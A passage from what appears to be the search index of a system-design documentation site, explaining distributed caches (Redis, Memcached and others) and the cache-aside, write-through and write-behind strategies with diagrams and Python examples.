\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502                     \u2502                     \u2502\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                             \u2193\n              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n              \u2502  Distributed Cache       \u2502\n              \u2502  (Redis / Memcached)     \u2502\n              \u2502  user:1 = Jane           \u2502 \u2190 Single source of truth\n              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                           \u2193\n                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                  \u2502    Database     \u2502\n                  \u2502  user:1 = Jane  \u2502\n                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nAll servers read from same cache - Always consistent!\n</code></pre></p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#characteristics-of-distributed-cache","title":"Characteristics of Distributed Cache","text":"<ol> <li>Shared: All application instances access the same cache</li> <li>Scalable: Can add more cache nodes to increase capacity</li> <li>Highly Available: Replication ensures no single point of failure</li> <li>Fast: In-memory storage for microsecond latency</li> <li>Consistent: All servers see same cached data</li> <li>Partitioned: Data distributed across multiple nodes (sharding)</li> </ol>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#popular-distributed-cache-systems","title":"Popular Distributed Cache Systems","text":"<p>1. Redis - In-memory data structure store - Supports strings, hashes, lists, sets, sorted sets - Persistence options (RDB, AOF) - Pub/Sub messaging - Lua scripting - Clustering and replication built-in - Use case: Session store, real-time analytics, leaderboards</p> <p>2. Memcached - Simple key-value store - Multi-threaded (better CPU utilization) - No persistence - LRU eviction - Very fast for simple caching - Use case: Pure caching layer, session storage</p> <p>3. Amazon ElastiCache - Managed Redis or Memcached - Auto-scaling, backup, monitoring - Use case: AWS cloud deployments</p> <p>4. Hazelcast - In-memory data grid (IMDG) - Distributed Java data structures - Compute grid capabilities - Use case: Java applications, distributed computing</p> <p>5. Apache Ignite - Distributed database and cache - SQL support - ACID transactions - Use case: Hybrid transactional/analytical processing</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#cache-architecture-patterns","title":"Cache Architecture Patterns","text":""},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#1-single-node-cache","title":"1. Single-Node Cache","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Local Cache  \u2502  \u2190 In-process (e.g., dict, LRU cache)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros: Fastest access, no network latency Cons: Not shared, limited by single server memory</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#2-centralized-cache","title":"2. Centralized Cache","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  App 1  \u2502    \u2502  App 2  \u2502    \u2502  App 3  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502              \u2502              \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                    \u2193\n            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502  Cache Server \u2502  \u2190 Single Redis/Memcached\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros: Shared cache, consistency Cons: Single point of failure, limited capacity</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#3-distributed-cache-cluster-recommended","title":"3. Distributed Cache Cluster (Recommended)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  App 1  \u2502    \u2502  App 2  \u2502    \u2502  App 3  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502              \u2502              \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                    \u2193\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502      Cache Cluster               \u2502\n     \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2510 \u2502\n     \u2502  \u2502 Node 1 \u2502  \u2502 Node 2 \u2502  \u2502 N3 \u2502 \u2502\n     \u2502  \u2502Shard A \u2502  \u2502Shard B \u2502  \u2502... \u2502 \u2502\n     \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2518 \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pros: High availability, scalable, fault-tolerant Cons: Complex setup, network overhead</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#caching-strategies-cache-patterns","title":"Caching Strategies (Cache Patterns)","text":"<p>Caching strategies determine when and how data is written to and read from the cache.</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#1-cache-aside-lazy-loading","title":"1. Cache-Aside (Lazy Loading)","text":"<p>Description: </p> <p>Cache-Aside, also known as Lazy Loading, is the most common and straightforward caching pattern where the application code is responsible for managing both the cache and the database. The cache sits \"aside\" the main data flow, and the application explicitly checks the cache before querying the database.</p> <p>Key Concept: The cache is only populated on-demand when data is actually requested (lazy), not during write operations. This means data is loaded into the cache only when it's needed, avoiding unnecessary caching of data that may never be accessed.</p> <p>How the pattern works conceptually: - The application owns the caching logic - it must explicitly check cache, handle misses, and update cache - On reads: Application tries cache first \u2192 if miss, query database \u2192 store in cache \u2192 return data - On writes: Application updates database \u2192 invalidates (or updates) relevant cache entries - The cache is passive - it doesn't know about the database; only the application knows both</p> <p>When cache is empty (cold start): Every request is a cache miss initially, gradually warming up as requests come in. This \"lazy\" approach means you only cache what's actually used, which is memory-efficient but has initial performance cost.</p> <p>Flow Diagram: <pre><code>Read Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Read(key)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u251c\u2500 2a. CACHE HIT? \u2192 Return value to app\n       \u2502\n       \u2514\u2500 2b. CACHE MISS?\n           \u2502\n           \u2193\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502  Database   \u2502\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n              \u2502\n              \u2514\u2500 3. App reads from DB\n                 4. App writes to cache\n                 5. Return to user\n\nWrite Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Write(key, value)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Database   \u2502  \u2190 Write to DB first\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2514\u2500 2. Invalidate cache (or update)\n          3. Next read will fetch fresh data\n</code></pre></p> <p>Python Implementation: <pre><code>import redis\nimport psycopg2\n\nclass CacheAside:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=mydb user=postgres\")\n\n    def get_user(self, user_id):\n        \"\"\"Cache-Aside Read\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Try to get from cache\n        cached_value = self.cache.get(cache_key)\n\n        if cached_value:\n            print(f\"CACHE HIT for user {user_id}\")\n            return cached_value\n\n        # 2. Cache miss - fetch from database\n        print(f\"CACHE MISS for user {user_id}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n        result = cursor.fetchone()\n\n        if result:\n            user_name = result[0]\n\n            # 3. Populate cache (with TTL of 1 hour)\n            self.cache.setex(cache_key, 3600, user_name)\n\n            return user_name\n\n        return None\n\n    def update_user(self, user_id, new_name):\n        \"\"\"Cache-Aside Write\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Write to database\n        cursor = self.db.cursor()\n        cursor.execute(\"UPDATE users SET name = %s WHERE id = %s\", (new_name, user_id))\n        self.db.commit()\n\n        # 2. Invalidate cache (cache will be repopulated on next read)\n        self.cache.delete(cache_key)\n\n        print(f\"Updated user {user_id} and invalidated cache\")\n\n# Usage\ncache_aside = CacheAside()\nprint(cache_aside.get_user(1))  # CACHE MISS - loads from DB\nprint(cache_aside.get_user(1))  # CACHE HIT - from cache\ncache_aside.update_user(1, \"Jane\")  # Invalidates cache\nprint(cache_aside.get_user(1))  # CACHE MISS - loads fresh data\n</code></pre></p> <p>Advantages: - \u2705 Cache only what's needed (lazy loading) - \u2705 Cache misses don't break the application (DB is source of truth) - \u2705 Application has full control over caching logic - \u2705 Works well for read-heavy workloads</p> <p>Disadvantages: - \u274c First request always misses cache (cold start) - \u274c Cache miss penalty (3 round trips: check cache \u2192 read DB \u2192 write cache) - \u274c Potential for stale data if cache isn't invalidated - \u274c Application code manages cache explicitly (more complex)</p> <p>When to Use: - Read-heavy applications - Unpredictable data access patterns - When you want application control over cache</p> <p>Common Pitfalls &amp; Solutions:</p> <ol> <li>Cache Stampede (Thundering Herd)</li> <li>Problem: When cache expires, multiple requests hit DB simultaneously</li> <li>Solution: Use cache locking or probabilistic early expiration</li> </ol> <pre><code>def get_user_with_lock(self, user_id):\n    \"\"\"Prevent cache stampede with distributed lock\"\"\"\n    cache_key = f\"user:{user_id}\"\n    lock_key = f\"lock:{cache_key}\"\n\n    cached_value = self.cache.get(cache_key)\n    if cached_value:\n        return cached_value\n\n    # Try to acquire lock\n    lock_acquired = self.cache.set(lock_key, \"1\", nx=True, ex=10)\n\n    if lock_acquired:\n        # This thread loads from DB\n        try:\n            cursor = self.db.cursor()\n            cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n            result = cursor.fetchone()\n\n            if result:\n                user_name = result[0]\n                self.cache.setex(cache_key, 3600, user_name)\n                return user_name\n        finally:\n            self.cache.delete(lock_key)\n    else:\n        # Other threads wait and retry\n        time.sleep(0.1)\n        return self.get_user_with_lock(user_id)\n</code></pre> <ol> <li>Stale Data After Update</li> <li>Problem: Cache not invalidated after DB update</li> <li>Solution: Always invalidate or update cache after DB write</li> </ol> <pre><code>def update_user_safe(self, user_id, new_name):\n    \"\"\"Ensure cache consistency with DB transaction\"\"\"\n    cache_key = f\"user:{user_id}\"\n\n    try:\n        # Start DB transaction\n        cursor = self.db.cursor()\n        cursor.execute(\"UPDATE users SET name = %s WHERE id = %s\", (new_name, user_id))\n        self.db.commit()\n\n        # Only invalidate cache if DB write succeeds\n        self.cache.delete(cache_key)\n        print(f\"Updated user {user_id} - cache invalidated\")\n    except Exception as e:\n        self.db.rollback()\n        print(f\"Update failed: {e}. Cache unchanged.\")\n        raise\n</code></pre> <p>Real-World Example: E-commerce Product Details</p> <pre><code>import json\nfrom typing import Optional, Dict\n\nclass ProductCacheAside:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=ecommerce user=postgres\")\n\n    def get_product_details(self, product_id: int) -&gt; Optional[Dict]:\n        \"\"\"Get product with reviews, inventory, and pricing\"\"\"\n        cache_key = f\"product:details:{product_id}\"\n\n        # Try cache first\n        cached_data = self.cache.get(cache_key)\n        if cached_data:\n            print(f\"\u2713 Cache HIT: Product {product_id}\")\n            return json.loads(cached_data)\n\n        # Cache miss - fetch from multiple tables\n        print(f\"\u2717 Cache MISS: Product {product_id} - querying database\")\n\n        cursor = self.db.cursor()\n\n        # Complex query joining multiple tables\n        cursor.execute(\"\"\"\n            SELECT p.id, p.name, p.price, p.description,\n                   i.stock_count, i.warehouse_location,\n                   AVG(r.rating) as avg_rating, COUNT(r.id) as review_count\n            FROM products p\n            LEFT JOIN inventory i ON p.id = i.product_id\n            LEFT JOIN reviews r ON p.id = r.product_id\n            WHERE p.id = %s\n            GROUP BY p.id, i.stock_count, i.warehouse_location\n        \"\"\", (product_id,))\n\n        result = cursor.fetchone()\n        if not result:\n            return None\n\n        product_data = {\n            'id': result[0],\n            'name': result[1],\n            'price': float(result[2]),\n            'description': result[3],\n            'stock': result[4],\n            'warehouse': result[5],\n            'avg_rating': float(result[6]) if result[6] else 0,\n            'review_count': result[7]\n        }\n\n        # Cache for 1 hour (product details don't change often)\n        self.cache.setex(cache_key, 3600, json.dumps(product_data))\n\n        return product_data\n\n    def update_product_price(self, product_id: int, new_price: float):\n        \"\"\"Update price and invalidate all related cache entries\"\"\"\n        try:\n            cursor = self.db.cursor()\n            cursor.execute(\n                \"UPDATE products SET price = %s WHERE id = %s\",\n                (new_price, product_id)\n            )\n            self.db.commit()\n\n            # Invalidate multiple related cache keys\n            keys_to_invalidate = [\n                f\"product:details:{product_id}\",\n                f\"product:price:{product_id}\",\n                \"products:featured\",  # May include this product\n                \"products:on_sale\"    # Price change may affect this list\n            ]\n\n            for key in keys_to_invalidate:\n                self.cache.delete(key)\n\n            print(f\"Updated product {product_id} price to ${new_price}\")\n            print(f\"Invalidated {len(keys_to_invalidate)} cache entries\")\n\n        except Exception as e:\n            self.db.rollback()\n            raise\n\n# Usage Example\nproduct_cache = ProductCacheAside()\n\n# First request - queries DB (expensive join)\nproduct = product_cache.get_product_details(123)\nprint(f\"Product: {product['name']}, Stock: {product['stock']}\")\n\n# Subsequent requests - served from cache (&lt; 1ms)\nproduct = product_cache.get_product_details(123)\n\n# Update price - invalidates cache\nproduct_cache.update_product_price(123, 99.99)\n\n# Next read - cache miss, fresh data loaded\nproduct = product_cache.get_product_details(123)\n</code></pre> <p>Performance Metrics: <pre><code>Without Cache:\n- Database query time: 50-100ms (complex joins)\n- Requests per second: ~20-50\n\nWith Cache-Aside:\n- Cache hit time: &lt;1ms\n- Cache miss time: 50-100ms (same as DB)\n- Cache hit ratio: 85-95% (typical)\n- Requests per second: 1000+ (mostly cache hits)\n- Database load reduction: 90%+\n</code></pre></p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#2-write-through-cache","title":"2. Write-Through Cache","text":"<p>Description: </p> <p>Write-Through is a caching pattern where every write operation goes through the cache to the database synchronously. The cache acts as the primary interface for writes, ensuring the cache and database are always perfectly synchronized.</p> <p>Key Concept: Write operations are never completed until both cache and database are updated. This guarantees that the cache is always a reliable, up-to-date representation of the database state - no stale data exists in the cache.</p> <p>How the pattern works conceptually: - On writes: Application \u2192 Cache (update) \u2192 Cache synchronously writes to Database \u2192 Confirm to application - On reads: Application \u2192 Cache (always returns fresh data, rarely needs to touch database) - The cache is active/smart - it knows about the database and handles persistence - Strong consistency: At any given moment, cache exactly mirrors the database</p> <p>Trade-off: Write latency increases because every write waits for both cache and database operations to complete. However, this cost is often acceptable because reads (which are typically more frequent) become extremely fast since data is guaranteed to be in cache.</p> <p>Difference from Cache-Aside: In Cache-Aside, writes go to DB first and cache may be invalidated. In Write-Through, cache is the write interface and it propagates to DB. This means Write-Through guarantees cache population on write, while Cache-Aside may leave cache empty after a write.</p> <p>Flow Diagram: <pre><code>Write Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Write(key, value)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502  \u2190 Write to cache first\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 2. Cache writes to DB synchronously\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Database   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2514\u2500 3. Confirm write to app\n\nRead Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Read(key)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502  \u2190 Always returns fresh data (no DB query)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>Python Implementation: <pre><code>class WriteThrough:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=mydb user=postgres\")\n\n    def get_user(self, user_id):\n        \"\"\"Read from cache (always up-to-date)\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # Try cache first\n        cached_value = self.cache.get(cache_key)\n        if cached_value:\n            print(f\"CACHE HIT for user {user_id}\")\n            return cached_value\n\n        # If not in cache, load from DB and cache it\n        print(f\"CACHE MISS for user {user_id}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n        result = cursor.fetchone()\n\n        if result:\n            user_name = result[0]\n            self.cache.set(cache_key, user_name)\n            return user_name\n\n        return None\n\n    def create_user(self, user_id, name):\n        \"\"\"Write-Through: Write to cache AND database\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Write to cache\n        self.cache.set(cache_key, name)\n\n        # 2. Write to database synchronously\n        cursor = self.db.cursor()\n        cursor.execute(\"INSERT INTO users (id, name) VALUES (%s, %s)\", (user_id, name))\n        self.db.commit()\n\n        print(f\"Created user {user_id} in both cache and database\")\n\n    def update_user(self, user_id, new_name):\n        \"\"\"Write-Through: Update cache AND database\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Update cache\n        self.cache.set(cache_key, new_name)\n\n        # 2. Update database synchronously\n        cursor = self.db.cursor()\n        cursor.execute(\"UPDATE users SET name = %s WHERE id = %s\", (new_name, user_id))\n        self.db.commit()\n\n        print(f\"Updated user {user_id} in both cache and database\")\n\n# Usage\nwrite_through = WriteThrough()\nwrite_through.create_user(1, \"John\")\nprint(write_through.get_user(1))  # CACHE HIT - always in cache\nwrite_through.update_user(1, \"Jane\")\nprint(write_through.get_user(1))  # CACHE HIT - updated data\n</code></pre></p> <p>Advantages: - \u2705 Cache and database always consistent - \u2705 No stale data - \u2705 Read performance is excellent (always hits cache) - \u2705 Simplifies read logic (cache is source of truth for reads)</p> <p>Disadvantages: - \u274c Write latency increases (writes to cache AND DB) - \u274c Every write goes to both cache and DB (even if data never read) - \u274c Wasted cache space for rarely accessed data - \u274c Higher write load on cache</p> <p>When to Use: - Applications requiring strong consistency - Read-heavy workloads with predictable write patterns - When data must always be cached after write</p> <p>Implementation Considerations:</p> <ol> <li>Write Latency Impact</li> <li>Every write waits for both cache AND database</li> <li>Use connection pooling to minimize latency</li> <li> <p>Consider async replication for non-critical data</p> </li> <li> <p>Transaction Handling</p> </li> <li>Ensure atomicity between cache and DB writes</li> <li>Rollback cache if DB write fails</li> </ol> <pre><code>def create_user_with_transaction(self, user_id, name, email):\n    \"\"\"Write-Through with proper transaction handling\"\"\"\n    cache_key = f\"user:{user_id}\"\n    user_data = json.dumps({'name': name, 'email': email})\n\n    try:\n        # Write to cache first (faster)\n        self.cache.set(cache_key, user_data)\n\n        # Write to database\n        cursor = self.db.cursor()\n        cursor.execute(\n            \"INSERT INTO users (id, name, email) VALUES (%s, %s, %s)\",\n            (user_id, name, email)\n        )\n        self.db.commit()\n\n        print(f\"\u2713 User {user_id} created in cache and DB\")\n\n    except Exception as e:\n        # Rollback: Remove from cache if DB write failed\n        self.cache.delete(cache_key)\n        self.db.rollback()\n        print(f\"\u2717 Write failed: {e}. Cache rolled back.\")\n        raise\n</code></pre> <p>Real-World Example: Session Management</p> <pre><code>import json\nimport uuid\nfrom datetime import datetime, timedelta\n\nclass SessionStore:\n    \"\"\"Write-Through cache for user sessions - always consistent\"\"\"\n\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=sessions user=postgres\")\n\n    def create_session(self, user_id: int, ip_address: str) -&gt; str:\n        \"\"\"Create new session - Write-Through ensures immediate consistency\"\"\"\n        session_id = str(uuid.uuid4())\n        session_data = {\n            'user_id': user_id,\n            'ip_address': ip_address,\n            'created_at': datetime.now().isoformat(),\n            'last_accessed': datetime.now().isoformat()\n        }\n\n        cache_key = f\"session:{session_id}\"\n\n        try:\n            # 1. Write to cache (fast access for all requests)\n            self.cache.setex(\n                cache_key,\n                86400,  # 24 hour expiry\n                json.dumps(session_data)\n            )\n\n            # 2. Write to database (persistence, analytics)\n            cursor = self.db.cursor()\n            cursor.execute(\"\"\"\n                INSERT INTO sessions (id, user_id, ip_address, created_at, last_accessed)\n                VALUES (%s, %s, %s, %s, %s)\n            \"\"\", (\n                session_id,\n                user_id,\n                ip_address,\n                session_data['created_at'],\n                session_data['last_accessed']\n            ))\n            self.db.commit()\n\n            print(f\"\u2713 Session {session_id} created for user {user_id}\")\n            return session_id\n\n        except Exception as e:\n            # Cleanup on failure\n            self.cache.delete(cache_key)\n            self.db.rollback()\n            raise\n\n    def get_session(self, session_id: str) -&gt; Optional[Dict]:\n        \"\"\"Get session - always from cache (guaranteed to be there)\"\"\"\n        cache_key = f\"session:{session_id}\"\n\n        cached_data = self.cache.get(cache_key)\n        if cached_data:\n            print(f\"\u2713 Session {session_id[:8]}... found in cache\")\n            return json.loads(cached_data)\n\n        # Should rarely happen (only if cache was cleared)\n        print(f\"\u26a0 Session {session_id[:8]}... not in cache, checking DB\")\n\n        cursor = self.db.cursor()\n        cursor.execute(\n            \"SELECT user_id, ip_address, created_at, last_accessed FROM sessions WHERE id = %s\",\n            (session_id,)\n        )\n        result = cursor.fetchone()\n\n        if result:\n            # Re-populate cache\n            session_data = {\n                'user_id': result[0],\n                'ip_address': result[1],\n                'created_at': result[2].isoformat(),\n                'last_accessed': result[3].isoformat()\n            }\n            self.cache.setex(cache_key, 86400, json.dumps(session_data))\n            return session_data\n\n        return None\n\n    def update_session_activity(self, session_id: str):\n        \"\"\"Update last accessed time - Write-Through keeps everything in sync\"\"\"\n        cache_key = f\"session:{session_id}\"\n\n        # Get current session data\n        cached_data = self.cache.get(cache_key)\n        if not cached_data:\n            return False\n\n        session_data = json.loads(cached_data)\n        session_data['last_accessed'] = datetime.now().isoformat()\n\n        try:\n            # Update cache\n            self.cache.setex(cache_key, 86400, json.dumps(session_data))\n\n            # Update database\n            cursor = self.db.cursor()\n            cursor.execute(\n                \"UPDATE sessions SET last_accessed = %s WHERE id = %s\",\n                (session_data['last_accessed'], session_id)\n            )\n            self.db.commit()\n\n            return True\n\n        except Exception as e:\n            # If DB update fails, revert cache to old value\n            self.cache.setex(cache_key, 86400, cached_data)\n            self.db.rollback()\n            raise\n\n# Usage Example\nsession_store = SessionStore()\n\n# Create session - written to both cache and DB\nsession_id = session_store.create_session(user_id=42, ip_address=\"192.168.1.1\")\n\n# Get session - always from cache (fast)\nsession = session_store.get_session(session_id)\nprint(f\"User: {session['user_id']}, IP: {session['ip_address']}\")\n\n# Update activity - both cache and DB updated\nsession_store.update_session_activity(session_id)\n</code></pre> <p>Why Write-Through for Sessions? - \u2705 Consistency: Cache and DB always in sync - \u2705 Read Performance: Every session read is a cache hit (&lt; 1ms) - \u2705 Reliability: Sessions persisted to DB (survive cache restart) - \u2705 Analytics: DB has all session data for reporting - \u26a0\ufe0f Write Cost: Acceptable because session creates/updates are infrequent compared to reads</p> <p>Performance Comparison: <pre><code>Session Reads (per request):\n- Without cache: 10-20ms (DB query)\n- With Write-Through cache: &lt;1ms (cache hit)\n- Improvement: 10-20x faster\n\nSession Writes:\n- Write-Through: 15-25ms (cache + DB)\n- Cache-Aside: 10-20ms (DB only)\n- Trade-off: Slightly slower writes for much faster reads\n</code></pre></p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#3-write-behind-write-back-cache","title":"3. Write-Behind (Write-Back) Cache","text":"<p>Description: </p> <p>Write-Behind, also called Write-Back, is a high-performance caching pattern where write operations complete as soon as data is written to cache, and the database write happens asynchronously in the background. This decouples the application from database write latency.</p> <p>Key Concept: The cache becomes the primary data store from the application's perspective, and the database is updated \"eventually\" through background processes. This provides blazing-fast write performance but introduces eventual consistency and potential data loss risks.</p> <p>How the pattern works conceptually: - On writes: Application \u2192 Cache (immediate update) \u2192 Return success immediately \u2192 Background process writes to DB later - The database write happens in a separate thread/process - often batched with other writes - Write coalescing: Multiple writes to same key can be collapsed into single DB operation - Eventual consistency: Cache has latest data, but database lags behind temporarily (milliseconds to seconds)</p> <p>Asynchronous mechanisms: - Time-based batching: Flush to DB every N seconds (e.g., every 5 seconds) - Size-based batching: Flush when N writes accumulate (e.g., every 100 writes) - Hybrid: Flush based on time OR size, whichever comes first</p> <p>Critical consideration: If cache fails before background write completes, data in the queue is lost. This makes it unsuitable for critical data (financial transactions, user accounts) but perfect for high-volume, less-critical data (analytics, logs, game scores).</p> <p>Performance benefit: Can handle 10-100x more writes than Write-Through because application isn't blocked by slow database operations. Database load is also reduced through batching and coalescing.</p> <p>Flow Diagram: <pre><code>Write Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application 